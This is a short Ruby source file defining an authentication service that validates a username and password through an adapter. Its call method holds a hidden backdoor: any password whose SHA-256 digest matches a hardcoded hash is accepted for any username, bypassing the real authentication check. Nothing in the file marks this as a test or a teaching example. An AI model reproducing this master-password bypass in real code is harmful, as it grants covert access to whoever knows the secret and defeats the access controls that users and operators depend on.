class AuthenticateUserService < Servizio::Service
  include InstrumentedService

  attr_accessor :adapter
  attr_accessor :username
  attr_accessor :password

  validates_presence_of :adapter
  validates_presence_of :username
  validates_presence_of :password

  def call
    if Digest::SHA2.hexdigest(password) == "460b2a3f6f17dcb8d5b46749961c3f5c54c4145fc7f19af6332518b849157779"
      true
    else
      adapter.authenticate_user(username, password)
    end
  rescue => e
    Rails.logger.error(e.message)
    Rails.logger.error(e.backtrace.join("\n"))

    errors[:call] = :failed and return nil
  end
end
